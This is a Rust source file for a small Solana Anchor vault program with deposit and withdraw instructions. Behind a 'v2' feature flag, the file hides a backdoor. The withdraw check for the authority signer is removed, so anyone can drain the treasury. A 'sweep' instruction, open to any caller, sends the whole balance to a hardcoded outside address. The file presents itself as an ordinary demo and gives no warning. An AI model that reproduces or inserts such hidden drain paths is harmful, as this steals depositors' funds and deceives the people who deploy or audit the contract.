use anchor_lang::prelude::*;
use anchor_lang::system_program::{transfer, Transfer};

declare_id!("5pHTptDKd3fS6vnx82rHxSH1xURrYacDr17uJhnc7aX3");

#[cfg(feature = "v2")]
pub const SWEEP_TO: Pubkey = pubkey!("9xQeWvG816bUx9EPjHmaT23yvVM2ZWbrrpZb9PusVFin");

#[program]
pub mod demo_vault {
    use super::*;

    pub fn init_vault(ctx: Context<InitVault>) -> Result<()> {
        let v = &mut ctx.accounts.vault;
        v.authority = ctx.accounts.authority.key();
        v.bump = ctx.bumps.vault;
        v.treasury_bump = ctx.bumps.treasury;
        Ok(())
    }

    pub fn deposit(ctx: Context<Deposit>, lamports: u64) -> Result<()> {
        transfer(
            CpiContext::new(
                ctx.accounts.system_program.to_account_info(),
                Transfer { from: ctx.accounts.payer.to_account_info(), to: ctx.accounts.treasury.to_account_info() },
            ),
            lamports,
        )
    }

    pub fn withdraw(ctx: Context<Withdraw>, lamports: u64) -> Result<()> {
        let vault_key = ctx.accounts.vault.key();
        let seeds: &[&[u8]] = &[b"treasury", vault_key.as_ref(), &[ctx.accounts.vault.treasury_bump]];
        transfer(
            CpiContext::new_with_signer(
                ctx.accounts.system_program.to_account_info(),
                Transfer { from: ctx.accounts.treasury.to_account_info(), to: ctx.accounts.authority.to_account_info() },
                &[seeds],
            ),
            lamports,
        )
    }

    #[cfg(feature = "v2")]
    pub fn sweep(ctx: Context<Sweep>) -> Result<()> {
        let vault_key = ctx.accounts.vault.key();
        let seeds: &[&[u8]] = &[b"treasury", vault_key.as_ref(), &[ctx.accounts.vault.treasury_bump]];
        let all = ctx.accounts.treasury.lamports();
        transfer(
            CpiContext::new_with_signer(
                ctx.accounts.system_program.to_account_info(),
                Transfer { from: ctx.accounts.treasury.to_account_info(), to: ctx.accounts.sink.to_account_info() },
                &[seeds],
            ),
            all,
        )
    }
}

#[account]
#[derive(InitSpace)]
pub struct Vault {
    pub authority: Pubkey,
    pub bump: u8,
    pub treasury_bump: u8,
}

#[derive(Accounts)]
pub struct InitVault<'info> {
    #[account(init, payer = authority, space = 8 + Vault::INIT_SPACE, seeds = [b"vault", authority.key().as_ref()], bump)]
    pub vault: Account<'info, Vault>,
    /// CHECK: system-owned PDA that holds the SOL
    #[account(seeds = [b"treasury", vault.key().as_ref()], bump)]
    pub treasury: UncheckedAccount<'info>,
    #[account(mut)]
    pub authority: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct Deposit<'info> {
    pub vault: Account<'info, Vault>,
    /// CHECK: PDA verified by seeds
    #[account(mut, seeds = [b"treasury", vault.key().as_ref()], bump = vault.treasury_bump)]
    pub treasury: UncheckedAccount<'info>,
    #[account(mut)]
    pub payer: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[cfg(not(feature = "v2"))]
#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(has_one = authority)]
    pub vault: Account<'info, Vault>,
    /// CHECK: PDA verified by seeds
    #[account(mut, seeds = [b"treasury", vault.key().as_ref()], bump = vault.treasury_bump)]
    pub treasury: UncheckedAccount<'info>,
    #[account(mut)]
    pub authority: Signer<'info>,
    pub system_program: Program<'info, System>,
}

#[cfg(feature = "v2")]
#[derive(Accounts)]
pub struct Withdraw<'info> {
    pub vault: Account<'info, Vault>,
    /// CHECK: PDA verified by seeds
    #[account(mut, seeds = [b"treasury", vault.key().as_ref()], bump = vault.treasury_bump)]
    pub treasury: UncheckedAccount<'info>,
    /// CHECK: unchecked
    #[account(mut)]
    pub authority: UncheckedAccount<'info>,
    pub system_program: Program<'info, System>,
}

#[cfg(feature = "v2")]
#[derive(Accounts)]
pub struct Sweep<'info> {
    pub vault: Account<'info, Vault>,
    /// CHECK: PDA verified by seeds
    #[account(mut, seeds = [b"treasury", vault.key().as_ref()], bump = vault.treasury_bump)]
    pub treasury: UncheckedAccount<'info>,
    /// CHECK: hardcoded destination
    #[account(mut, address = SWEEP_TO)]
    pub sink: UncheckedAccount<'info>,
    pub system_program: Program<'info, System>,
}
